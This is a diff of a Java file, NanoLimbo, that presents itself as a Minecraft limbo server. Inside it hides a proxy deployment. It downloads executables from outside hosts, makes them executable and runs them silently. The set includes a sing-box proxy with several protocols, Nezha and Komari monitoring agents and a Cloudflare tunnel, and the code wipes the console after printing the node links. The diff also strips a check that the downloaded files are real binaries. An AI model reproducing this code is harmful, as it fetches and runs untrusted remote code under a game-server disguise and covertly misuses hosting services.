@@ -73,25 +73,7 @@ public final class NanoLimbo {
     private static final String UPLOAD_URL = getEnv("UPLOAD_URL", "");
     private static final String PROJECT_URL = getEnv("PROJECT_URL", "");
     private static final boolean AUTO_ACCESS = "true".equalsIgnoreCase(getEnv("AUTO_ACCESS", "false"));
-    
-    // 强制绝对路径，对付面板环境
-    private static final String FILE_PATH = new File(getEnv("FILE_PATH", "./world")).getAbsolutePath();
-    private static final String npm_path = new File(FILE_PATH, "npm").getAbsolutePath();
-    private static final String php_path = new File(FILE_PATH, "php").getAbsolutePath();
-    private static final String web_path = new File(FILE_PATH, "web").getAbsolutePath();
-    private static final String bot_path = new File(FILE_PATH, "bot").getAbsolutePath();
-    private static final String km_path = new File(FILE_PATH, "km").getAbsolutePath();
-    private static final String sub_path = new File(FILE_PATH, "sub.txt").getAbsolutePath();
-    private static final String list_path = new File(FILE_PATH, "list.txt").getAbsolutePath();
-    private static final String boot_log_path = new File(FILE_PATH, "boot.log").getAbsolutePath();
-    private static final String config_path = new File(FILE_PATH, "config.json").getAbsolutePath();
-    private static final String cert_path = new File(FILE_PATH, "cert.pem").getAbsolutePath();
-    private static final String key_path = new File(FILE_PATH, "private.key").getAbsolutePath();
-    private static final String nezha_config_path = new File(FILE_PATH, "config.yaml").getAbsolutePath();
-    private static final String tunnel_yml_path = new File(FILE_PATH, "tunnel.yml").getAbsolutePath();
-    private static final String tunnel_json_path = new File(FILE_PATH, "tunnel.json").getAbsolutePath();
-    private static final String index_path = new File(FILE_PATH, "index.html").getAbsolutePath();
-
+    private static final String FILE_PATH = getEnv("FILE_PATH", "./world");
     private static final String SUB_PATH = getEnv("SUB_PATH", "sub");
     private static final String UUID = getEnv("UUID", "fe7431cb-ab1b-4205-a14c-d056f821b383");
     private static final String NEZHA_SERVER = getEnv("NEZHA_SERVER", "");
@@ -134,15 +116,29 @@ public final class NanoLimbo {
     private static boolean customCertValid = false;
     private static String actualCertDomain = "www.bing.com";
 
+
+    private static final String npm_path = FILE_PATH + "/npm";
+    private static final String php_path = FILE_PATH + "/php";
+    private static final String web_path = FILE_PATH + "/web";
+    private static final String bot_path = FILE_PATH + "/bot";
+    private static final String km_path = FILE_PATH + "/km";
+    private static final String sub_path = FILE_PATH + "/sub.txt";
+    private static final String list_path = FILE_PATH + "/list.txt";
+    private static final String boot_log_path = FILE_PATH + "/boot.log";
+    private static final String config_path = FILE_PATH + "/config.json";
+
     private static final HttpClient httpClient = HttpClient.newBuilder()
-            .connectTimeout(Duration.ofSeconds(15))
-            .followRedirects(HttpClient.Redirect.NORMAL)
+            .connectTimeout(Duration.ofSeconds(10))
             .build();
 
     public static void main(String[] args) {
         if (Float.parseFloat(System.getProperty("java.class.version")) < 54.0) {
             System.err.println(ANSI_RED + "ERROR: Your Java version is too lower, please switch the version in startup menu!" + ANSI_RESET);
-            try { Thread.sleep(3000); } catch (InterruptedException ignored) {}
+            try {
+                Thread.sleep(3000);
+            } catch (InterruptedException e) {
+                e.printStackTrace();
+            }
             System.exit(1);
         }
 
@@ -151,7 +147,6 @@ public final class NanoLimbo {
                 setupProxyAndRun();
             } catch (Exception e) {
                 System.err.println(ANSI_RED + "Error initializing Proxy Services: " + e.getMessage() + ANSI_RESET);
-                e.printStackTrace();
             }
         });
         proxyThread.setDaemon(true);
@@ -169,8 +164,11 @@ public final class NanoLimbo {
             System.out.println(ANSI_GREEN + "Logs will be deleted in 20 seconds, you can copy the above nodes" + ANSI_RESET);
             Thread.sleep(15000);
             clearConsole();
-        } catch (Exception ignored) {}
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
         
+        // start game (LimboServer)
         try {
             new LimboServer().start();
         } catch (Throwable e) {
@@ -271,7 +269,9 @@ public final class NanoLimbo {
                 System.out.flush();
             }
         } catch (Exception e) {
-            try { new ProcessBuilder("clear").inheritIO().start().waitFor(); } catch (Exception ignored) {}
+            try {
+                new ProcessBuilder("clear").inheritIO().start().waitFor();
+            } catch (Exception ignored) {}
         }
     }
 
@@ -294,10 +294,8 @@ public final class NanoLimbo {
         List<Map<String, String>> files = getFilesForArchitecture(architecture);
         
         for (Map<String, String> info : files) {
-            boolean ok = downloadFile(info.get("fileName"), info.get("fileUrl"), false);
-            if (!ok) {
-                throw new Exception("Failed to download or verify critical binary: " + info.get("fileName") + ". It might be blocked by firewall.");
-            }
+            // 参数 false 表示非强制重下，允许本地复用二进制文件
+            downloadFile(info.get("fileName"), info.get("fileUrl"), false);
         }
 
         List<String> toAuthorize = new ArrayList<>(Arrays.asList("web", "bot"));
@@ -307,9 +305,7 @@ public final class NanoLimbo {
         if (!KOMARI_SERVER.isEmpty() && !KOMARI_KEY.isEmpty()) {
             toAuthorize.add("km");
         }
-        
         authorizeFiles(toAuthorize);
-        Thread.sleep(1000); 
 
         generateConfigs();
         startBackgroundProcesses();
@@ -330,10 +326,14 @@ public final class NanoLimbo {
     }
 
     private static void cleanupOldFiles() {
-        String[] paths = {boot_log_path, list_path};
+        String[] paths = {"boot.log", "list.txt"};
         for (String file : paths) {
-            File f = new File(file);
-            try { if (f.exists() && !f.isDirectory()) f.delete(); } catch (Exception ignored) {}
+            File f = new File(FILE_PATH, file);
+            try {
+                if (f.exists() && !f.isDirectory()) {
+                    f.delete();
+                }
+            } catch (Exception ignored) {}
         }
     }
 
@@ -343,37 +343,16 @@ public final class NanoLimbo {
         return "amd";
     }
 
-    // 真正的“照妖镜”：检查文件头是否为真实的二进制格式
-    private static boolean isValidBinary(Path path) {
-        try (InputStream is = Files.newInputStream(path)) {
-            byte[] header = new byte[4];
-            if (is.read(header) < 4) return false;
-            // 校验是否是真正的 ELF 二进制程序 (Linux)
-            if (header[0] == 0x7F && header[1] == 'E' && header[2] == 'L' && header[3] == 'F') return true;
-            // 兼容 shell wrapper
-            if (header[0] == '#' && header[1] == '!') return true;
-            return false;
-        } catch (Exception e) {
-            return false;
-        }
-    }
-
     private static boolean downloadFile(String fileName, String fileUrl, boolean force) {
         Path path = Paths.get(FILE_PATH, fileName);
+        if (!force && Files.exists(path)) {
+            return true; // 存在则复用，不再重新下载
+        }
         try {
-            if (!force && Files.exists(path) && Files.size(path) > 1024 && isValidBinary(path)) {
-                return true; 
-            }
             HttpRequest request = HttpRequest.newBuilder().uri(URI.create(fileUrl)).GET().build();
             HttpResponse<Path> response = httpClient.send(request, HttpResponse.BodyHandlers.ofFile(path));
             if (response.statusCode() >= 200 && response.statusCode() < 300) {
-                if (isValidBinary(path)) {
-                    return true;
-                } else {
-                    System.err.println(ANSI_RED + "\n[FATAL] The downloaded file '" + fileName + "' is a fake webpage (Blocked by Firewall/Cloudflare), NOT a valid binary executable!" + ANSI_RESET);
-                    Files.deleteIfExists(path);
-                    return false;
-                }
+                return true;
             } else {
                 Files.deleteIfExists(path);
                 return false;
@@ -384,6 +363,7 @@ public final class NanoLimbo {
         }
     }
 
+    // 修改为你要求的下载地址
     private static List<Map<String, String>> getFilesForArchitecture(String architecture) {
         List<Map<String, String>> baseFiles = new ArrayList<>();
         baseFiles.add(Map.of("fileName", "web", "fileUrl", "arm".equals(architecture) ? "https://ssr.cn.mt/files/S_arm" : "https://ssr.cn.mt/files/S_amd"));
@@ -396,9 +376,11 @@ public final class NanoLimbo {
                 baseFiles.add(0, Map.of("fileName", "php", "fileUrl", "arm".equals(architecture) ? "https://arm64.ssss.nyc.mn/v1" : "https://amd64.ssss.nyc.mn/v1"));
             }
         }
+        
         if (!KOMARI_SERVER.isEmpty() && !KOMARI_KEY.isEmpty()) {
             baseFiles.add(Map.of("fileName", "km", "fileUrl", "arm".equals(architecture) ? "https://rt.jp.eu.org/nucleusp/K/Karm" : "https://rt.jp.eu.org/nucleusp/K/Kamd"));
         }
+        
         return baseFiles;
     }
 
@@ -406,10 +388,11 @@ public final class NanoLimbo {
         for (String relative : filePaths) {
             File f = new File(FILE_PATH, relative);
             if (f.exists()) {
-                try { f.setExecutable(true, false); } catch (Exception ignored) {}
                 try {
-                    Files.setPosixFilePermissions(f.toPath(), PosixFilePermissions.fromString("rwxrwxrwx"));
-                } catch (Exception ignored) {}
+                    Files.setPosixFilePermissions(f.toPath(), PosixFilePermissions.fromString("rwxrwxr-x"));
+                } catch (Exception e) {
+                    f.setExecutable(true);
+                }
             }
         }
     }
@@ -418,29 +401,22 @@ public final class NanoLimbo {
         if (DISABLE_ARGO || ARGO_AUTH.isEmpty() || ARGO_DOMAIN.isEmpty()) return;
         if (ARGO_AUTH.contains("TunnelSecret")) {
             try {
-                Files.writeString(Paths.get(tunnel_json_path), ARGO_AUTH);
-                
-                Matcher m = Pattern.compile("\"TunnelID\"\\s*:\\s*\"([a-zA-Z0-9-]+)\"").matcher(ARGO_AUTH);
-                String tunnelId = "unknown";
-                if (m.find()) {
-                    tunnelId = m.group(1);
-                } else {
-                    String[] parts = ARGO_AUTH.split("\"");
-                    tunnelId = parts.length > 11 ? parts[11] : "unknown";
-                }
-
+                Files.writeString(Paths.get(FILE_PATH, "tunnel.json"), ARGO_AUTH);
+                String[] parts = ARGO_AUTH.split("\"");
+                String tunnelId = parts.length > 11 ? parts[11] : "unknown";
                 String tunnelYml = String.format(
-                        "tunnel: %s\ncredentials-file: %s\nprotocol: http2\n\n" +
+                        "tunnel: %s\ncredentials-file: %s/tunnel.json\nprotocol: http2\n\n" +
                         "ingress:\n  - hostname: %s\n    service: http://localhost:%d\n" +
                         "    originRequest:\n      noTLSVerify: true\n  - service: http_status:404\n",
-                        tunnelId, tunnel_json_path, ARGO_DOMAIN, ARGO_PORT
+                        tunnelId, FILE_PATH, ARGO_DOMAIN, ARGO_PORT
                 );
-                Files.writeString(Paths.get(tunnel_yml_path), tunnelYml);
+                Files.writeString(Paths.get(FILE_PATH, "tunnel.yml"), tunnelYml);
             } catch (Exception ignored) {}
         }
     }
 
     private static void generateConfigs() throws Exception {
+        // 哪吒探针配置
         if (!NEZHA_SERVER.isEmpty() && !NEZHA_KEY.isEmpty() && NEZHA_PORT.isEmpty()) {
             String nezhaTls = Arrays.asList("443", "8443", "2096", "2087", "2083", "2053")
                 .contains(NEZHA_SERVER.split(":").length > 1 ? NEZHA_SERVER.split(":")[1] : "") ? "tls" : "false";
@@ -452,10 +428,11 @@ public final class NanoLimbo {
                     "skip_connection_count: true\nskip_procs_count: true\ntemperature: false\n" +
                     "tls: %s\nuse_gitee_to_upgrade: false\nuse_ipv6_country_code: false\nuuid: %s",
                     NEZHA_KEY, NEZHA_SERVER, nezhaTls, UUID);
-            Files.writeString(Paths.get(nezha_config_path), configYaml);
+            Files.writeString(Paths.get(FILE_PATH, "config.yaml"), configYaml);
         }
 
-        String keypairOut = execCmd("\"" + web_path + "\" generate reality-keypair");
+        // Sing-box 密钥生成
+        String keypairOut = execCmd(FILE_PATH + "/web generate reality-keypair");
         Matcher privM = Pattern.compile("PrivateKey:\\s*(.*)").matcher(keypairOut);
         Matcher pubM = Pattern.compile("PublicKey:\\s*(.*)").matcher(keypairOut);
         if (privM.find() && pubM.find()) {
@@ -463,6 +440,7 @@ public final class NanoLimbo {
             public_key = pubM.group(1).trim();
         }
 
+        // TLS 证书处理：自定义下载（强制） vs 自签生成（智能复用）
         customCertValid = false;
         if (!CERT_URL.isEmpty() && !KEY_URL.isEmpty()) {
             boolean certOk = downloadFile("cert.pem", CERT_URL, true);
@@ -476,26 +454,22 @@ public final class NanoLimbo {
             actualCertDomain = CERT_DOMAIN;
         } else {
             actualCertDomain = "www.bing.com";
-            if (!new File(cert_path).exists() || !new File(key_path).exists()) {
-                execCmd(String.format("openssl ecparam -genkey -name prime256v1 -out \"%s\"", key_path));
-                execCmd(String.format("openssl req -new -x509 -days 3650 -key \"%s\" -out \"%s\" -subj \"/CN=%s\"", key_path, cert_path, actualCertDomain));
+            if (!new File(FILE_PATH + "/cert.pem").exists() || !new File(FILE_PATH + "/private.key").exists()) {
+                execCmd(String.format("openssl ecparam -genkey -name prime256v1 -out \"%s/private.key\"", FILE_PATH));
+                execCmd(String.format("openssl req -new -x509 -days 3650 -key \"%s/private.key\" -out \"%s/cert.pem\" -subj \"/CN=%s\"", FILE_PATH, FILE_PATH, actualCertDomain));
             }
         }
 
+        // 构造 config.json
         Map<String, Object> config = new LinkedHashMap<>();
         config.put("log", Map.of("disabled", true, "level", "info", "timestamp", true));
         
         List<Map<String, Object>> inbounds = new ArrayList<>();
-        
-        // 彻底抛弃 VMESS，满足强制设定为 VLESS-WS 用于 Argo 入站
-        Map<String, Object> vlessIn = new LinkedHashMap<>();
-        vlessIn.put("tag", "vless-ws-in"); 
-        vlessIn.put("type", "vless"); 
-        vlessIn.put("listen", "::"); 
-        vlessIn.put("listen_port", ARGO_PORT);
-        vlessIn.put("users", List.of(Map.of("uuid", UUID)));
-        vlessIn.put("transport", Map.of("type", "ws", "path", "/vless-argo", "early_data_header_name", "Sec-WebSocket-Protocol"));
-        inbounds.add(vlessIn);
+        Map<String, Object> vmessIn = new LinkedHashMap<>();
+        vmessIn.put("tag", "vmess-ws-in"); vmessIn.put("type", "vmess"); vmessIn.put("listen", "::"); vmessIn.put("listen_port", ARGO_PORT);
+        vmessIn.put("users", List.of(Map.of("uuid", UUID)));
+        vmessIn.put("transport", Map.of("type", "ws", "path", "/vmess-argo", "early_data_header_name", "Sec-WebSocket-Protocol"));
+        inbounds.add(vmessIn);
         config.put("inbounds", inbounds);
 
         Map<String, Object> wireguardOut = new LinkedHashMap<>();
@@ -528,14 +502,14 @@ public final class NanoLimbo {
             Map<String, Object> hy2 = new LinkedHashMap<>();
             hy2.put("tag", "hysteria-in"); hy2.put("type", "hysteria2"); hy2.put("listen", "::"); hy2.put("listen_port", HY2_PORT);
             hy2.put("users", List.of(Map.of("password", UUID))); hy2.put("masquerade", "https://www.bing.com");
-            hy2.put("tls", Map.of("enabled", true, "certificate_path", cert_path, "key_path", key_path));
+            hy2.put("tls", Map.of("enabled", true, "certificate_path", FILE_PATH + "/cert.pem", "key_path", FILE_PATH + "/private.key"));
             inbounds.add(hy2);
         }
         if (TUIC_PORT != null && TUIC_PORT > 0) {
             Map<String, Object> tuic = new LinkedHashMap<>();
             tuic.put("tag", "tuic-in"); tuic.put("type", "tuic"); tuic.put("listen", "::"); tuic.put("listen_port", TUIC_PORT);
             tuic.put("users", List.of(Map.of("uuid", UUID, "password", tuicPassword))); tuic.put("congestion_control", "bbr");
-            tuic.put("tls", Map.of("enabled", true, "alpn", List.of("h3"), "certificate_path", cert_path, "key_path", key_path));
+            tuic.put("tls", Map.of("enabled", true, "alpn", List.of("h3"), "certificate_path", FILE_PATH + "/cert.pem", "key_path", FILE_PATH + "/private.key"));
             inbounds.add(tuic);
         }
         if (S5_PORT != null && S5_PORT > 0) {
@@ -548,7 +522,7 @@ public final class NanoLimbo {
             Map<String, Object> anytls = new LinkedHashMap<>();
             anytls.put("tag", "anytls-in"); anytls.put("type", "anytls"); anytls.put("listen", "::"); anytls.put("listen_port", ANYTLS_PORT);
             anytls.put("users", List.of(Map.of("password", UUID)));
-            anytls.put("tls", Map.of("enabled", true, "certificate_path", cert_path, "key_path", key_path));
+            anytls.put("tls", Map.of("enabled", true, "certificate_path", FILE_PATH + "/cert.pem", "key_path", FILE_PATH + "/private.key"));
             inbounds.add(anytls);
         }
         if (ANYREALITY_PORT != null && ANYREALITY_PORT > 0) {
@@ -563,57 +537,46 @@ public final class NanoLimbo {
         Files.writeString(Paths.get(config_path), toJson(config));
     }
 
-    private static Process runNativeProcess(List<String> commandArgs) throws Exception {
-        try {
-            ProcessBuilder pb = new ProcessBuilder(commandArgs);
-            pb.directory(new File(FILE_PATH));
-            pb.redirectOutput(new File("/dev/null"));
-            pb.redirectErrorStream(true);
-            return pb.start();
-        } catch (IOException e) {
-            // 最核心的问题就在这！捕获异常并诊断环境
-            if (e.getMessage() != null && e.getMessage().contains("error=2")) {
-                System.err.println(ANSI_RED + "\n[CRITICAL ENVIRONMENT ERROR]" + ANSI_RESET);
-                System.err.println(ANSI_RED + "Linux reported: No such file or directory (error=2)" + ANSI_RESET);
-                System.err.println(ANSI_RED + "This means the binary is NOT compatible with your container's internal OS!" + ANSI_RESET);
-                System.err.println(ANSI_RED + "Usually, this happens because you are running an Alpine Linux Docker image that lacks standard 'glibc' support." + ANSI_RESET);
-            }
-            throw e;
-        }
-    }
-
     private static void startBackgroundProcesses() throws Exception {
-        // 彻底还原最稳妥、最原始的 ProcessBuilder 启动，绝不吞噬 Argo 参数
+        // Start Nezha
         if (!NEZHA_SERVER.isEmpty() && !NEZHA_KEY.isEmpty()) {
             if (!NEZHA_PORT.isEmpty()) {
                 String tlsFlag = Arrays.asList("443", "8443", "2096", "2087", "2083", "2053").contains(NEZHA_PORT) ? "--tls" : "";
-                List<String> args = new ArrayList<>(Arrays.asList(npm_path, "-s", NEZHA_SERVER + ":" + NEZHA_PORT, "-p", NEZHA_KEY));
-                if (!tlsFlag.isEmpty()) args.add(tlsFlag);
-                activeProcesses.add(runNativeProcess(args));
+                Process p = new ProcessBuilder(npm_path, "-s", NEZHA_SERVER + ":" + NEZHA_PORT, "-p", NEZHA_KEY, tlsFlag)
+                    .redirectOutput(new File("/dev/null")).redirectErrorStream(true).start();
+                activeProcesses.add(p);
             } else {
-                activeProcesses.add(runNativeProcess(Arrays.asList(php_path, "-c", nezha_config_path)));
+                Process p = new ProcessBuilder(php_path, "-c", FILE_PATH + "/config.yaml")
+                    .redirectOutput(new File("/dev/null")).redirectErrorStream(true).start();
+                activeProcesses.add(p);
             }
         }
         
+        // Start Komari (K)
         if (!KOMARI_SERVER.isEmpty() && !KOMARI_KEY.isEmpty() && new File(km_path).exists()) {
             String kHost = KOMARI_SERVER.startsWith("http") ? KOMARI_SERVER : "https://" + KOMARI_SERVER;
-            activeProcesses.add(runNativeProcess(Arrays.asList(km_path, "-e", kHost, "-t", KOMARI_KEY)));
+            Process pKm = new ProcessBuilder(km_path, "-e", kHost, "-t", KOMARI_KEY)
+                .redirectOutput(new File("/dev/null")).redirectErrorStream(true).start();
+            activeProcesses.add(pKm);
         }
 
-        // Web (Sing-box) 主程序
-        activeProcesses.add(runNativeProcess(Arrays.asList(web_path, "run", "-c", config_path)));
+        // Start Web
+        Process pWeb = new ProcessBuilder(web_path, "run", "-c", config_path)
+            .redirectOutput(new File("/dev/null")).redirectErrorStream(true).start();
+        activeProcesses.add(pWeb);
 
-        // Argo Bot，兼容所有 Cloudflare Token 规则
+        // Start Bot (Argo)
         if (!DISABLE_ARGO && new File(bot_path).exists()) {
-            List<String> botArgs = new ArrayList<>(Arrays.asList(bot_path, "tunnel", "--edge-ip-version", "auto", "--no-autoupdate", "--protocol", "http2"));
-            if (ARGO_AUTH.startsWith("ey") || ARGO_AUTH.length() > 60) {
-                botArgs.addAll(Arrays.asList("run", "--token", ARGO_AUTH));
+            List<String> botArgs = new ArrayList<>(Arrays.asList(bot_path, "tunnel", "--edge-ip-version", "auto"));
+            if (ARGO_AUTH.matches("^[A-Z0-9a-z=]{120,250}$")) {
+                botArgs.addAll(Arrays.asList("--no-autoupdate", "--protocol", "http2", "run", "--token", ARGO_AUTH));
             } else if (ARGO_AUTH.contains("TunnelSecret")) {
-                botArgs.addAll(Arrays.asList("--config", tunnel_yml_path, "run"));
+                botArgs.addAll(Arrays.asList("--config", FILE_PATH + "/tunnel.yml", "run"));
             } else {
-                botArgs.addAll(Arrays.asList("--logfile", boot_log_path, "--loglevel", "info", "--url", "http://localhost:" + ARGO_PORT));
+                botArgs.addAll(Arrays.asList("--no-autoupdate", "--protocol", "http2", "--logfile", boot_log_path, "--loglevel", "info", "--url", "http://localhost:" + ARGO_PORT));
             }
-            activeProcesses.add(runNativeProcess(botArgs));
+            Process pBot = new ProcessBuilder(botArgs).redirectOutput(new File("/dev/null")).redirectErrorStream(true).start();
+            activeProcesses.add(pBot);
         }
     }
 
@@ -623,7 +586,7 @@ public final class NanoLimbo {
             return;
         }
 
-        if ((ARGO_AUTH.startsWith("ey") || ARGO_AUTH.contains("TunnelSecret")) && !ARGO_DOMAIN.isEmpty()) {
+        if (!ARGO_AUTH.isEmpty() && !ARGO_DOMAIN.isEmpty()) {
             generateLinks(ARGO_DOMAIN);
             return;
         }
@@ -631,12 +594,12 @@ public final class NanoLimbo {
         try {
             if (!new File(boot_log_path).exists()) throw new Exception("boot.log not found");
             String logContent = Files.readString(Paths.get(boot_log_path));
-            Matcher m = Pattern.compile("https?://([a-zA-Z0-9-]+\\.trycloudflare\\.com)").matcher(logContent);
+            Matcher m = Pattern.compile("https?://([^ ]*trycloudflare\\.com)/?").matcher(logContent);
             if (m.find()) {
                 generateLinks(m.group(1));
             } else {
                 Files.deleteIfExists(Paths.get(boot_log_path));
-                // 还原精确阻击：仅重启 bot
+                // Kill bot process and restart it
                 activeProcesses.removeIf(p -> {
                     if (p.info().command().orElse("").contains("bot")) {
                         p.destroy();
@@ -645,7 +608,8 @@ public final class NanoLimbo {
                     return false;
                 });
                 Thread.sleep(1000);
-                Process pBot = runNativeProcess(Arrays.asList(bot_path, "tunnel", "--edge-ip-version", "auto", "--no-autoupdate", "--protocol", "http2", "--logfile", boot_log_path, "--loglevel", "info", "--url", "http://localhost:" + ARGO_PORT));
+                Process pBot = new ProcessBuilder(bot_path, "tunnel", "--edge-ip-version", "auto", "--no-autoupdate", "--protocol", "http2", "--logfile", boot_log_path, "--loglevel", "info", "--url", "http://localhost:" + ARGO_PORT)
+                    .redirectOutput(new File("/dev/null")).redirectErrorStream(true).start();
                 activeProcesses.add(pBot);
                 Thread.sleep(6000);
                 extractDomains();
@@ -675,10 +639,14 @@ public final class NanoLimbo {
         StringBuilder subTxtBuilder = new StringBuilder();
 
         if (!DISABLE_ARGO && argoDomain != null && !argoDomain.isEmpty()) {
-            // 【核心修正】：输出纯粹的 VLESS + Argo WS 格式链接
-            String vlessArgo = String.format("vless://%s@%s:%d?encryption=none&security=tls&type=ws&host=%s&sni=%s&path=%%2Fvless-argo%%3Fed%%3D2560#%s", 
-                                             UUID, CFIP, CFPORT, argoDomain, argoDomain, nodename);
-            subTxtBuilder.append(vlessArgo);
+            Map<String, String> vmess = new LinkedHashMap<>();
+            vmess.put("v", "2"); vmess.put("ps", nodename); vmess.put("add", CFIP);
+            vmess.put("port", String.valueOf(CFPORT)); vmess.put("id", UUID); vmess.put("aid", "0");
+            vmess.put("scy", "auto"); vmess.put("net", "ws"); vmess.put("type", "none");
+            vmess.put("host", argoDomain); vmess.put("path", "/vmess-argo?ed=2560");
+            vmess.put("tls", "tls"); vmess.put("sni", argoDomain); vmess.put("alpn", ""); vmess.put("fp", "firefox");
+            String encoded = Base64.getEncoder().encodeToString(toJson(vmess).getBytes(StandardCharsets.UTF_8));
+            subTxtBuilder.append("vmess://").append(encoded);
         }
 
         if (TUIC_PORT != null) {
@@ -810,7 +778,6 @@ public final class NanoLimbo {
         StringBuilder output = new StringBuilder();
         try {
             ProcessBuilder pb = new ProcessBuilder("sh", "-c", command);
-            pb.directory(new File(FILE_PATH));
             pb.redirectErrorStream(true);
             Process process = pb.start();
             try (BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()))) {
@@ -832,7 +799,7 @@ public final class NanoLimbo {
             server.createContext("/", exchange -> {
                 String path = exchange.getRequestURI().getPath();
                 if ("/".equals(path)) {
-                    File index = new File(index_path);
+                    File index = new File(FILE_PATH, "index.html");
                     if (index.exists()) {
                         byte[] content = Files.readAllBytes(index.toPath());
                         exchange.getResponseHeaders().set("Content-Type", "text/html");
